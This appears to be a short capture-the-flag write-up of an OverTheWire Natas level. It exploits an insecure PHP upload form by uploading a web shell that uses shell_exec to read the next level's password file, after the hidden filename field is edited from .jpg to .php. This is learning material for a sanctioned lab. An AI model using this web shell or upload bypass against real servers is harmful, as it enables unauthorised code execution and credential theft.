> JPG upload
- i noticed in the php source code there was a lot going on w paths, so I decided to upload a random image and see what path it assigned
- after uploading, it created the path `upload/31015rouhv.jpg`
- navigating to the `upload` page, I get a 403 forbidden error
- this part of the code caught my eye
```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```
- I tried directory traversing by changing the filename, but windows didn't allow the name (rude but wtv)
- then I had this wild realization
- none of my file uploads have been jpeg images, so it'll take any file that's under a KB
- plus, the file extension literally doesn't matter; it's just replaced with jpg:
```php
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```
- we can change the file extension later, but for now we make a php file:
```
<?php
$pass= shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$pass</pre>";
?>
```
- before uploading the file, we change this part of the code using inspect:
```html
<input type="hidden" name="filename" value="h1v1kpgdru.jpg">
```
- to this:
```html
<input type="hidden" name="filename" value="h1v1kpgdru.php">
```
- the output `The file upload/3r6hcmpt63.php has been uploaded` contains the correct file extension, and navigating to the path gives us the password
